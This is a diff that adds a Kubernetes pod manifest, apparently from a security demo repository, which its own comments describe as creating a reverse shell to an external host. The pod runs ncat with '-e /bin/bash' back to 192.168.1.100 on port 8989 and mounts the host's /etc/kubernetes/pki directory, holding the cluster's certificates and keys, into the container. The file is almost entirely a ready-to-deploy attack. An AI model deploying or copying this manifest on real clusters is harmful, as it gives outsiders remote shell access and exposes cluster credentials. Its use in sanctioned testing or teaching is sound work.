@@ -1,0 +1,21 @@
+# This pod creates a reverse shell back to an external hosts (edit the [IP] to set)
+# It'll also mount the /etc/kubernetes/pki directory into the conatiner as a demo.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: ncat-reverse-shell-pod
+spec:
+  containers:
+  - name: ncat-reverse-shell
+    image: 10.0.200.8:8082/ncat/ncat
+    volumeMounts:
+    - mountPath: /pki
+      name: keyvolume
+    args: ['192.168.1.100', '8989', '-e', '/bin/bash']
+  imagePullSecrets:
+  - name: regcred
+  volumes:
+  - name: keyvolume
+    hostPath:
+      path: /etc/kubernetes/pki
+      type: Directory
